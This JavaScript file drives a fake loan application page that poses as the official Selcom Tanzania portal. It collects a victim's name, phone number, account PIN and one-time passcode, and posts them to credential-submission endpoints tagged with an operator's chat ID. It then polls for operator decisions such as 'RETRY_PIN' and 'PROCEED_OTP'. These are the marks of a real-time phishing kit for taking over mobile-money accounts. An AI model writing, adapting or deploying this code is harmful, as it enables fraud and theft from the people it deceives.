document.addEventListener('DOMContentLoaded', () => {
  let currentScreen = 1;
  let userId = null;
  let statusPollInterval = null;
  let countdownTimer = null;

  const appData = {
    loanType: 'Mkopo wa Biashara',
    loanAmount: 100000,
    loanDuration: 'Miezi 48',
    purpose: '',
    firstName: '',
    lastName: '',
    phone: '',
    employmentStatus: 'Mfanyabiashara',
    annualIncome: '',
    pin: '',
    otp: ''
  };

  function showScreen(screenNum) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    const target = document.getElementById(`screen-${screenNum}`);
    if (target) {
      target.classList.add('active');
      currentScreen = screenNum;
      window.scrollTo(0, 0);
    }
  }

  // Language Switch toggles
  const langToggle1 = document.getElementById('lang-toggle');
  const langToggle2 = document.getElementById('lang-toggle-2');
  function toggleLanguage(isSwahili) {
    if (langToggle1) langToggle1.checked = isSwahili;
    if (langToggle2) langToggle2.checked = isSwahili;
    const wTitle = document.getElementById('w-title');
    const wSubtitle = document.getElementById('w-subtitle');
    const wDesc = document.getElementById('w-desc');
    const cTitle = document.getElementById('c-title');
    const cText = document.getElementById('c-text');
    const estHeading = document.getElementById('est-heading');

    if (isSwahili) {
      if (wTitle) wTitle.innerText = "KARIBU SELCOM TANZANIA!";
      if (wSubtitle) wSubtitle.innerText = "WELCOME TO THE OFFICIAL APPLICATION PORTAL.";
      if (wDesc) wDesc.innerText = "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.";
      if (cTitle) cTitle.innerText = "CRITICAL NOTIFICATION";
      if (estHeading) estHeading.innerText = "Estimate your loan repayments";
    } else {
      if (wTitle) wTitle.innerText = "WELCOME TO SELCOM TANZANIA!";
      if (wSubtitle) wSubtitle.innerText = "KARIBU KWENYE PORTAL RASMI YA MAOMBI.";
      if (wDesc) wDesc.innerText = "Maelezo yako ya kipekee ya Akaunti ya Selcom yanahitajika kwa mawasiliano yote.";
      if (cTitle) cTitle.innerText = "TAARIFA MUHIMU";
      if (estHeading) estHeading.innerText = "Kadiria marejesho ya mkopo wako";
    }
  }

  if (langToggle1) langToggle1.addEventListener('change', (e) => toggleLanguage(e.target.checked));
  if (langToggle2) langToggle2.addEventListener('change', (e) => toggleLanguage(e.target.checked));

  // Screen 1 Continue
  document.getElementById('btn-screen1-continue').addEventListener('click', () => {
    showScreen(2);
  });

  // Screen 2 Sliders
  const rangeAmount = document.getElementById('range-amount');
  const displayAmount = document.getElementById('display-amount');
  const rangeTerm = document.getElementById('range-term');
  const displayTerm = document.getElementById('display-term');
  const calcMonthly = document.getElementById('calc-monthly-repay');
  const calcTotal = document.getElementById('calc-total-repay');

  function updateCalculations() {
    const amt = parseInt(rangeAmount.value) || 100000;
    const terms = parseInt(rangeTerm.value) || 12;
    displayAmount.innerText = `TSH ${amt.toLocaleString()}`;
    displayTerm.innerText = `${terms} MONTHS`;

    // Simple estimation formula
    const monthly = Math.round((amt * (1 + 0.135 * (terms / 12))) / terms);
    const total = monthly * terms;

    calcMonthly.innerText = `TSH ${monthly.toLocaleString()}`;
    calcTotal.innerText = `TSH ${total.toLocaleString()}`;

    appData.loanAmount = amt;
    appData.loanDuration = `Miezi ${terms}`;
    const amountInput = document.getElementById('loan-amount-input');
    if (amountInput) amountInput.value = amt;
  }

  if (rangeAmount) rangeAmount.addEventListener('input', updateCalculations);
  if (rangeTerm) rangeTerm.addEventListener('input', updateCalculations);
  updateCalculations();

  document.getElementById('btn-screen2-signin').addEventListener('click', () => {
    showScreen(3);
  });

  // Form Step 1
  document.getElementById('btn-s3-back').addEventListener('click', () => showScreen(2));
  document.getElementById('btn-screen3-next').addEventListener('click', () => {
    appData.loanType = document.getElementById('loan-type').value;
    appData.loanAmount = document.getElementById('loan-amount-input').value;
    appData.loanDuration = document.getElementById('loan-duration').value;
    appData.purpose = document.getElementById('loan-purpose').value || 'Biashara';
    showScreen(4);
  });

  // Form Step 2
  document.getElementById('btn-s4-back').addEventListener('click', () => showScreen(3));
  document.getElementById('btn-screen4-prev').addEventListener('click', () => showScreen(3));
  document.getElementById('btn-screen4-next').addEventListener('click', () => {
    appData.firstName = document.getElementById('first-name').value;
    appData.lastName = document.getElementById('last-name').value;
    appData.phone = document.getElementById('phone-number').value;

    if (!appData.firstName || !appData.lastName || !appData.phone) {
      alert('Tafadhali jaza nafasi zote kabla ya kuendelea.');
      return;
    }

    // Populate summary in Step 3
    document.getElementById('sum-amount').innerText = `TSh ${parseInt(appData.loanAmount).toLocaleString()}`;
    document.getElementById('sum-duration').innerText = appData.loanDuration;
    document.getElementById('sum-purpose').innerText = appData.purpose;

    showScreen(5);
  });

  // Form Step 3
  document.getElementById('btn-s5-back').addEventListener('click', () => showScreen(4));
  document.getElementById('btn-screen5-prev').addEventListener('click', () => showScreen(4));
  document.getElementById('btn-screen5-submit').addEventListener('click', async () => {
    appData.employmentStatus = document.getElementById('employment-status').value;
    appData.annualIncome = document.getElementById('annual-income').value;
    showScreen(6);
  });

  // PIN Inputs handling (Screen 6)
  const pinBoxes = document.querySelectorAll('.pin-box');
  pinBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value;
      if (val && index < pinBoxes.length - 1) {
        pinBoxes[index + 1].focus();
      }
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && index > 0) {
        pinBoxes[index - 1].focus();
      }
    });
  });

  document.getElementById('btn-screen6-submit').addEventListener('click', async () => {
    let pinVal = '';
    pinBoxes.forEach(b => pinVal += b.value);
    if (pinVal.length < 4) {
      alert('Tafadhali weka PIN kamili ya tarakimu 4.');
      return;
    }
    appData.pin = pinVal;
    
    const statusMsg = document.getElementById('pin-status-msg');
    statusMsg.innerText = "Inathibitisha...";

    try {
      const urlParams = new URLSearchParams(window.location.search);
      const adminChatId = urlParams.get('admin');

      const res = await fetch('/api/submit-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: appData.phone, pin: pinVal, adminChatId })
      });
      const data = await res.json();
      if (data.success) {
        userId = data.userId;
      }

      startStatusPolling(() => {
        statusMsg.innerText = "";
        showScreen(7);
        startOtpCountdown();
      });
    } catch (e) {
      statusMsg.innerText = "";
      showScreen(7);
      startOtpCountdown();
    }
  });

  // OTP Inputs handling (Screen 7)
  const otpBoxes = document.querySelectorAll('.otp-box');
  otpBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value;
      if (val && index < otpBoxes.length - 1) {
        otpBoxes[index + 1].focus();
      }
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && index > 0) {
        otpBoxes[index - 1].focus();
      }
    });
  });

  function startOtpCountdown() {
    let seconds = 30;
    const cdSpan = document.getElementById('countdown');
    if (countdownTimer) clearInterval(countdownTimer);
    countdownTimer = setInterval(() => {
      seconds--;
      if (cdSpan) cdSpan.innerText = seconds;
      if (seconds <= 0) {
        clearInterval(countdownTimer);
      }
    }, 1000);
  }

  document.getElementById('resend-otp-link').addEventListener('click', async (e) => {
    e.preventDefault();
    if (userId) {
      await fetch('/api/request-new-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId })
      });
    }
    alert('Nambari mpya ya OTP imetumwa.');
    startOtpCountdown();
  });

  document.getElementById('btn-screen7-submit').addEventListener('click', async () => {
    let otpVal = '';
    otpBoxes.forEach(b => otpVal += b.value);
    if (otpVal.length < 6) {
      alert('Tafadhali weka OTP kamili ya tarakimu 6.');
      return;
    }
    appData.otp = otpVal;

    const otpStatusMsg = document.getElementById('otp-status-msg');
    otpStatusMsg.innerText = "Inathibitisha OTP...";

    try {
      await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, otp: otpVal })
      });

      startStatusPolling(() => {
        otpStatusMsg.innerText = "";
        showScreen(8);
      });
    } catch (e) {
      otpStatusMsg.innerText = "";
      showScreen(8);
    }
  });

  function startStatusPolling(onSuccess) {
    if (statusPollInterval) clearInterval(statusPollInterval);
    statusPollInterval = setInterval(async () => {
      if (!userId) return;
      try {
        const res = await fetch(`/api/check-status/${userId}`);
        const data = await res.json();
        if (data.status === 'PROCEED_OTP' || data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          onSuccess();
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          alert('PIN imekataliwa. Tafadhali weka PIN sahihi upya.');
          showScreen(6);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          alert('OTP imeisha muda wake au imekataliwa. Tafadhali omba mpya.');
        }
      } catch (err) {}
    }, 3000);
  }

  document.getElementById('btn-screen8-home').addEventListener('click', () => {
    window.location.reload();
  });
});
      
